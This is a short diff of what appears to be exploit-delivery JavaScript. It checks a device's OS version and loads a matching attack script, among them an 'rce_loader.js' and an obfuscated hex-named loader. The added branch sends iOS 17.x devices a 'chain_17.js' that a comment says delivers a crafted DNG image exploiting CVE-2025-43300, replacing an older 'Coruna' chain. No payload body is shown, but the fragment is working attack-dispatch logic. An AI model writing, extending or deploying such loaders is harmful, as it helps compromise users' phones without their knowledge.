@@ -26,6 +26,10 @@
     loadScript('loader_26_deploy.js');
   } else if (ver >= 180400) {
     loadScript('rce_loader.js');
+  } else if (ver >= 170300) {
+    // iOS 17.x: deliver the crafted DNG for CVE-2025-43300 instead of the
+    // legacy Coruna chain, which does not trigger on these builds.
+    loadScript('chain_17.js');
   } else {
     loadScript('34ef644ff217a50beadde64dc8e23a7dx.js?channelcode=9c9cea3e7025615403562882657f2e70');
   }
